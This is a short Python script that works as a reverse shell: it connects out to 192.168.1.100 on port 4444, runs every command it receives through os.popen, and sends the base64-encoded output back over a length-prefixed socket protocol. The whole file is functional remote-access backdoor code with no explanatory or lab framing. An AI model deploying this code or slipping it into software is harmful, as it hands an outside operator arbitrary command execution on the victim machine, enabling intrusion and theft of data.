import socket
import struct
import threading
import base64
import os

def create_tcp_tunnel(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

def send_packet(sock, data):
    payload = struct.pack('!I', len(data)) + data
    sock.send(payload)

def recv_packet(sock):
    header = recv_all(sock, 4)
    if not header:
        return None
    length = struct.unpack('!I', header)[0]
    return recv_all(sock, length)

def recv_all(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def execute_command(cmd):
    try:
        result = os.popen(cmd.decode('utf-8')).read()
    except Exception as e:
        result = str(e)
    return result.encode('utf-8')

def main():
    s = create_tcp_tunnel('192.168.1.100', 4444)
    while True:
        try:
            cmd = recv_packet(s)
            if not cmd:
                break
            if cmd == b'exit':
                break
            output = execute_command(cmd)
            send_packet(s, base64.b64encode(output))
        except Exception as e:
            send_packet(s, base64.b64encode(str(e).encode('utf-8')))
    s.close()

if __name__ == '__main__':
    main()

